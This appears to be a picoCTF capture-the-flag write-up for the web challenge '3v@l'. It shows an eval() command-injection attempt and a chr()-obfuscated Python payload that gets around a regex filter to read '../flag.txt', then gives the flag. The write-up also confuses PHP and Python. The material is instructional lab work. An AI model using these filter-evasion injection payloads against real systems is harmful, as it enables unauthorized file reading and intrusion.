# Challenge web: 3v@l
![image](https://github.com/user-attachments/assets/b5ee0c6e-303e-4230-8a74-dd450c60d041)

first i was mentioned about rce, and eval() after researching for a while i found some interesting information(https://medium.com/@pkhuyar/the-danger-of-php-eval-a23410187ca2) , I was mentioned about rce, and eval() after researching for a while I found some interesting information, I went to the website and tried those payloads:

eval("system('ls');");
![image](https://github.com/user-attachments/assets/fa66e028-e4ae-4604-a3e8-364ba3db6463)

As you can see, I got filtered exactly as suggested in suggestion 1 above, so once we have determined the right direction and how do we Bypass the regex as suggested

because eval() is related to php so after I asked google and chatted GPT I was suggested to use: chr().
![image](https://github.com/user-attachments/assets/f7a72bad-af7c-405c-b1d9-544c684d5880)

After a while of searching with a nice friend of mine we finally found a payload that passed the filter:

getattr(
    open(
        chr(46)+chr(46)+chr(47)+chr(102)+chr(108)+chr(97)+chr(103)+chr(46)+chr(116)+chr(120)+chr(116)
    ),
    "r" + "ead"
)()

analysis as follows:

 chr(46) + chr(46) → ".."
    chr(46) = "." 
    chr(47) → "/" 
    chr(102) + chr(108) + chr(97) + chr(103) → "flag"
        chr(102) = "f"
        chr(108) = "l"
        chr(97) = "a"
        chr(103) = "g"
    chr(46) = "." 
    chr(116) + chr(120) + chr(116) → "txt"
        chr(116) = "t"
        chr(120) = "x"
        chr(116) = "t"
        
=> it will be :   getattr(
    open("../flag.txt"),
    "read"
)() and bypass the filter successfully.
![image](https://github.com/user-attachments/assets/39a2e476-bdae-484c-8f74-5ab3a5296a05)

Problem Solved: picoCTF{D0nt_Use_Unsecure_f@nctions68288869}.
